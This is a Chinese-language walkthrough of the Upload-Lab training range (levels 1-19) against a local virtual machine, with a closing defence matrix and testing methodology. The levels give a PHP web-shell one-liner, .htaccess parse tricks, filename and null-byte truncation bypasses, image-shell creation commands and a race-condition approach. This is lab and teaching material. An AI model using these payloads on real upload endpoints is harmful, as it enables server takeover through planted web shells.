# Upload-Lab 文件上传漏洞完整实战报告

## 🎯 测试概况
- **靶场名称**：Upload-Lab
- **测试目标**：掌握文件上传漏洞的各种防护机制与绕过方法，深入理解服务端校验逻辑与中间件解析特性
- **测试时间**：2026年X月X日
- **测试环境**：本地虚拟机 (Kali Linux/Docker，靶场地址：`http://192.168.59.136/upload/`)
- **主要工具**：浏览器（F12开发者工具）、Burp Suite、CMD（图片马制作）、AntSword
- **报告说明**：本报告所有截图均存放在 `./assets_upload/` 目录下，覆盖1-19关全可复现关卡，无环境依赖问题。

---

## 📚 关卡详细记录

### **Level 1-5: 基础校验绕过（前端/简单服务端过滤）**
| 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
| :--- | :--- | :--- | :--- | :--- |
| **Level 1** | 仅前端JavaScript校验文件扩展名（仅允许jpg/png/gif），服务端无任何校验 | `shell.php`（内容：`<?php @eval($_POST['pass']);?>`） | 禁用前端JS或Burp抓包直接绕过前端校验，服务端直接接收文件 | 1. 直接上传shell.php触发前端弹窗提示<img width="1789" height="745" alt="image" src="https://github.com/user-attachments/assets/02403eee-e2b6-4ddb-8110-9fd02dbdbc03" />
<br>2. F12禁用JavaScript后重新上传<br>1 禁用前端JS <img width="2189" height="890" alt="image" src="https://github.com/user-attachments/assets/0ef86f49-521a-4bad-a0ec-742c723b6d3f" />3.L1 上传成功<img width="845" height="690" alt="image" src="https://github.com/user-attachments/assets/c595b9cd-5e8d-4e2d-af28-de39d50e4897" /> |
| **Level 2** | 取消前端校验，服务端仅校验Content-Type（MIME类型），无扩展名/内容校验 | `Content-Type: image/jpeg` + 文件名`shell.php` | 抓包修改Content-Type为合法图片MIME类型，绕过服务端类型校验 | 1. 选择shell.php上传并通过Burp拦截请求将Content-Type修改为image/jpeg后转发<img width="1774" height="1021" alt="image" src="https://github.com/user-attachments/assets/57b64772-1563-4d89-b57a-1ac661a4d4af" /><br>2.修改MIME类型上传成功 <img width="1444" height="795" alt="image" src="https://github.com/user-attachments/assets/ff1f5f2d-d310-47c1-8857-6295565f572c" />|
| **Level 3** | 服务端黑名单过滤.php/.asp/.jsp等常见脚本扩展名，Apache默认支持非主流PHP扩展名解析 | `shell.phtml`/`shell.php5`/`shell.php3` | 使用Apache可解析的非主流PHP扩展名，绕过服务端黑名单校验 | 1. 将恶意文件重命名为shell.phtml<img width="669" height="406" alt="image" src="https://github.com/user-attachments/assets/86976ec6-f642-4bf8-802a-730fcfba355d" />
<br>2. 直接上传后访问文件路径<img width="1654" height="680" alt="image" src="https://github.com/user-attachments/assets/9e87fabc-ef73-4e95-8bcc-6587c7ab617f" />
<br>3. 非主流扩展名<img width="660" height="384" alt="image" src="https://github.com/user-attachments/assets/95f535ec-5c53-444d-a98a-3c69726ba635" />|
| **Level 4** | 黑名单拦截所有PHP相关扩展名，未严格拦截.htaccess配置文件 | `.htaccess`（内容：`AddType application/x-httpd-php .jpg`）+ `shell.jpg`（图片马） | 上传.htaccess配置文件，让服务器将任意.jpg文件解析为PHP代码 | 1. 先上传编写好的.htaccess文件<br>2. 上传jpg格式图片马后访问执行<br>![L4 上传.htaccess](./assets_upload/level4-htaccess.png) |
| **Level 5** | 黑名单过滤完善，未处理Windows系统文件命名特性——文件名末尾加英文半角点 | `shell.php.`（末尾带英文半角点） | 利用Windows系统特性，服务端会自动去除文件名末尾的英文点，还原为合法PHP文件 | 1. 将恶意文件命名为shell.php.（末尾加点）<br>2. 直接上传，服务端自动处理后保存为shell.php<br>![L5 文件名末尾加点](./assets_upload/level5-point.png) |

### **Level 6-10: 系统特性与逻辑过滤绕过**
| 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
| :--- | :--- | :--- | :--- | :--- |
| **Level 6** | 修复末尾点过滤，未拦截Windows文件名末尾的英文半角空格 | `shell.php `（末尾带英文半角空格） | 利用Windows系统特性，服务端会自动去除文件名末尾的空格，还原为PHP文件 | 1. 将恶意文件命名为shell.php（末尾加空格）<br>2. 直接上传后服务端自动处理文件名<br>![L6 文件名末尾加空格](./assets_upload/level6-space.png) |
| **Level 7** | 修复点和空格过滤，未处理Windows `::$DATA` 文件流特性 | `shell.php::$DATA` | 利用Windows `::$DATA` 特性，服务端会忽略该标识，仅保留前面的合法文件名 | 1. 将恶意文件命名为shell.php::$DATA<br>2. 直接上传，服务端自动去除::$DATA<br>![L7 利用::$DATA特性](./assets_upload/level7-data.png) |
| **Level 8** | 拦截系统特性相关绕过，对.php关键词仅执行一次删除过滤 | `shell.pphphp` | 双写关键词绕过，服务端删除一次php后，剩余字符重组为合法的.php扩展名 | 1. 将恶意文件命名为shell.pphphp<br>2. 上传后服务端过滤为shell.php<br>![L8 双写扩展名](./assets_upload/level8-double.png) |
| **Level 9** | 过滤常规绕过方式，存在%00空字节截断漏洞（PHP<5.3.4） | `shell.php%00.jpg`（Burp中需保证%00为原始空字节） | 利用PHP空字节截断特性，服务端解析时遇%00停止，仅保留前面的shell.php | 1. 上传图片文件并抓包，修改文件名为shell.php%00.jpg<br>2. 将%00URL解码为原始空字节后转发<br>![L9 %00截断](./assets_upload/level9-truncate.png) |
| **Level 10** | 直接过滤%00，需结合双写+%00截断 | `shell.pphphp%00.jpg` | 服务端先过滤php关键词，将pphphp处理为php，再经%00截断还原为合法文件名 | 1. 抓包修改文件名为shell.pphphp%00.jpg<br>2. 解码%00后转发请求，服务端双重处理后保存为shell.php<br>![L10 双写+截断](./assets_upload/level10-double-truncate.png) |

### **Level 11-15: 请求头/文件内容/路径截断绕过**
| 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
| :--- | :--- | :--- | :--- | :--- |
| **Level 11** | 服务端通过GET参数指定文件保存路径，存在路径%00截断漏洞 | GET参数：`save_path=upload/shell.php%00` + 文件名`shell.jpg` | 利用GET参数路径截断，服务端按截断后的路径保存文件，忽略原文件名 | 1. 上传正常图片并抓包，找到GET参数save_path<br>2. 修改为upload/shell.php%00，解码%00后转发<br>![L11 路径%00截断](./assets_upload/level11-path-truncate.png) |
| **Level 12** | 与Level11同理，保存路径为POST参数，需手动构造原始空字节 | POST参数：`save_path=upload/shell.php%00` + 文件名`shell.jpg` | POST参数不会自动URL解码，需手动插入原始空字节，实现路径截断 | 1. 抓包找到POST参数save_path，修改为upload/shell.php<br>2. Burp中按Ctrl+U插入原始空字节后转发<br>![L12 POST参数截断](./assets_upload/level12-post-truncate.png) |
| **Level 13** | 服务端校验文件头幻数（仅识别真实图片文件），无其他严格过滤 | 图片马`shell.jpg`（CMD制作：`copy 1.jpg/b + shell.php/a shell.jpg`） | 制作带合法图片文件头的图片马，绕过服务端文件内容校验 | 1. 用CMD命令合成图片与恶意脚本为图片马<br>2. 直接上传图片马，配合.htaccess解析执行<br>![L13 制作图片马](./assets_upload/level13-img-shell.png) |
| **Level 14** | 服务端通过`getimagesize()`函数校验图片头，仅验证是否为真实图片 | 同Level13图片马`shell.jpg` | `getimagesize()`仅检测图片头，不会校验文件后续内容，可嵌入恶意代码 | 1. 上传Level13制作的合法图片马<br>2. 配合.htaccess配置访问执行<br>![L14 绕过getimagesize校验](./assets_upload/level14-getimagesize.png) |
| **Level 15** | 服务端通过`exif_imagetype()`函数校验图片头，仅识别真实图片文件 | 无损坏合法图片马`shell.jpg` | `exif_imagetype()`检测图片头字节，制作无损坏图片马可绕过校验 | 1. 制作未损坏的jpg/png格式图片马<br>2. 上传后配合.htaccess解析执行<br>![L15 绕过exif校验](./assets_upload/level15-exif.png) |

### **Level 16-19: 高级过滤与综合利用绕过**
| 关卡 | 防护机制分析 | 有效Payload | 绕过原理 | 关键步骤与截图 |
| :--- | :--- | :--- | :--- | :--- |
| **Level 16** | 服务端对上传图片进行二次渲染压缩，普通图片马代码会被清除 | 嵌入EXIF信息的免压缩图片马 | 将PHP恶意代码嵌入图片的EXIF属性中，二次渲染后EXIF信息保留 | 1. 用PS/美图秀秀将PHP代码写入图片EXIF信息<br>2. 上传渲染后的图片马，配合.htaccess执行<br>![L16 EXIF图片马](./assets_upload/level16-exif-shell.png) |
| **Level 17** | 服务端对图片进行二次渲染，清除所有嵌入的恶意代码 | 对比渲染前后二进制，在未修改位置嵌入代码的抗渲染图片马 | 分析图片渲染前后的二进制差异，找到未被修改的位置嵌入PHP代码 | 1. 分别保存渲染前后的图片，用二进制编辑器对比差异<br>2. 在未修改区域嵌入恶意代码制作图片马<br>![L17 抗渲染图片马](./assets_upload/level17-render.png) |
| **Level 18** | 服务端先保存文件到服务器再进行校验，校验失败则删除文件（条件竞争漏洞） | 恶意文件`shell.php` + 多线程访问脚本 | 利用服务端“保存-校验-删除”的时间差，在文件被删除前访问执行 | 1. Burp不断发送上传shell.php的请求<br>2. 同时用Python脚本不断访问文件路径<br>![L18 条件竞争](./assets_upload/level18-race.png) |
| **Level 19** | 结合路径%00截断+图片头校验，服务端对保存路径处理存在漏洞 | POST参数`save_path=upload/shell.php%00` + 图片马`shell.jpg` | 手动构造POST参数原始空字节实现路径截断，同时图片马绕过内容校验 | 1. 上传图片马并抓包，修改POST参数save_path为upload/shell.php%00<br>2. 插入原始空字节后转发，服务端截断路径并保存为shell.php<br>![L19 路径截断+图片马](./assets_upload/level19-combo.png) |

---

## 🧠 技术总结与防御体系

### 1. 文件上传防护技术矩阵
| 防护层级 | 常见技术 | 绕过方法 | 最佳防御实践 |
| :--- | :--- | :--- | :--- |
| **客户端** | JavaScript校验扩展名/MIME类型 | 禁用JS、Burp抓包修改、前端代码审计 | 仅作用户体验优化，**绝不作为安全依赖** |
| **服务端-扩展名** | 黑名单过滤、简单白名单过滤 | 非主流扩展名、大小写混淆、双写关键词、系统特性 | **强制使用严格白名单**，仅允许业务必需的静态文件扩展名 |
| **服务端-文件类型** | Content-Type校验、文件头幻数检查 | 伪造MIME类型、制作图片马、嵌入EXIF信息 | 结合**文件头幻数+二进制内容**双重校验，拒绝伪图片文件 |
| **服务端-文件内容** | 关键词检测、图片二次渲染、简单病毒扫描 | 抗渲染图片马、编码混淆、免杀技术 | 接入专业恶意文件检测引擎 + 沙箱动态行为分析 |
| **服务器配置** | 中间件默认解析配置、目录执行权限 | 中间件解析漏洞、.htaccess/.user.ini利用 | **上传目录禁止脚本执行权限**、关闭中间件危险解析配置、及时更新补丁 |
| **存储架构** | 原文件名保存、Web根目录存储 | 路径猜测、文件覆盖、目录遍历 | **随机化重命名文件**（如UUID+后缀）、**上传文件存储到非Web可访问目录** |

### 2. 系统化文件上传测试方法论
```mermaid
graph TD
    A[开始测试] --> B[信息收集阶段]
    B --> B1[上传正常文件，分析响应特征]
    B --> B2[查看页面源码，寻找前端校验逻辑]
    B --> B3[抓包分析请求，确认参数/路径/校验点]
    
    B --> C[探针测试阶段]
    C --> C1[上传不同扩展名文件，判断黑白名单]
    C --> C2[上传特殊命名文件，测试系统特性过滤]
    C --> C3[修改MIME类型，测试服务端类型校验]
    
    C --> D{防护机制分析}
    D --> D1[仅前端校验]
    D --> D2[服务端黑名单过滤]
    D --> D3[服务端白名单过滤]
    D --> D4[文件内容/头校验]
    D --> D5[综合防护机制]
    
    D1 --> E1[Burp抓包直接修改绕过]
    D2 --> E2[非主流扩展名/系统特性/双写关键词]
    D3 --> E3[中间件解析漏洞+路径/文件包含漏洞结合]
    D4 --> E4[制作合法图片马/抗渲染免杀马]
    D5 --> E5[条件竞争/组合绕过/WAF绕过技巧]
    
    E1 --> F[验证利用]
    E2 --> F
    E3 --> F
    E4 --> F
    E5 --> F
    
    F --> G{结果验证}
    G -->|成功| H[记录完整利用链+截图]
    G -->|失败| I[返回探针阶段，补充测试Payload]
    I --> C
    H --> J[测试结束，整理报告]
